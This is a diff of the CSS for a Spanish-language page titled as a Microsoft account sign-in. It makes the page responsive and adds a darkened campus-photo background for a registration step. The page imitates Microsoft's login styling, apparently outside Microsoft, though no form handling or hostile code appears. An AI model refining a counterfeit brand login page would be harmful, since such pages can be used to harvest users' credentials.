@@ -2,48 +2,53 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <title>Iniciar sesión en tu cuenta Microsoft</title>
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet" />
   <style>
     * { box-sizing: border-box; }
     body {
       width: 100%;
-      height: 100vh;
+      /* ===== FONDO RESPONSIVE: min-height en vez de height fijo, con dvh para móvil ===== */
+      min-height: 100vh;
+      min-height: 100dvh;
       margin: 0;
-      padding: 0;
+      padding: 16px;
+      overflow-x: hidden;
       font-family: "Segoe UI", "Helvetica Neue", sans-serif;
-      background: #f2f2f2;
+      background-color: #f2f2f2;
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
       display: flex;
       align-items: center;
       justify-content: center;
       transition: background 0.5s ease;
     }
     
-    /* ===== NUEVO: Fondo personalizado para paso 2 de registro ===== */
+    /* ===== FONDO RESPONSIVE: la capa oscura va DENTRO del mismo background ===== */
     body.registro-step2 {
-      background: url('campus.jpeg') center/cover no-repeat;
+      background-image:
+        linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)),
+        url('campus.jpeg');
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
+      background-attachment: scroll; /* en iOS 'fixed' rompe el cover */
     }
-    
-    body.registro-step2::before {
-      content: '';
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.3);
-      z-index: -1;
-    }
-    /* ===== FIN NUEVO ===== */
+    /* ===== FIN FONDO RESPONSIVE ===== */
     
     /* Contenedor principal estilo Microsoft */
     .ms-container {
-      width: 440px;
+      /* ===== FONDO RESPONSIVE: ancho fluido con tope, nunca se sale de pantalla ===== */
+      width: 100%;
+      max-width: 440px;
       min-height: 338px;
       padding: 44px;
       background: white;
       box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      position: relative;
+      z-index: 1;
     }
     
     /* Logo Microsoft */
@@ -246,6 +251,7 @@
       color: #1b1b1b;
       margin-left: 26px;
       margin-bottom: 12px;
+      word-break: break-all; /* correos largos no rompen el layout en móvil */
     }
     
     /* Aviso */
@@ -267,6 +273,21 @@
       display: block;
     }
     /* ===== FIN NUEVO ===== */
+
+    /* ===== FONDO RESPONSIVE: ajustes para pantallas pequeñas ===== */
+    @media (max-width: 480px) {
+      body { padding: 12px; align-items: flex-start; padding-top: 24px; }
+      .ms-container {
+        padding: 28px 22px;
+        min-height: auto;
+        box-shadow: 0 1px 4px rgba(0,0,0,0.18);
+      }
+      .ms-title { font-size: 21px; }
+    }
+    @media (max-height: 600px) {
+      body { align-items: flex-start; padding-top: 20px; }
+    }
+    /* ===== FIN FONDO RESPONSIVE ===== */
   </style>
 </head>
 <body class="access-page">
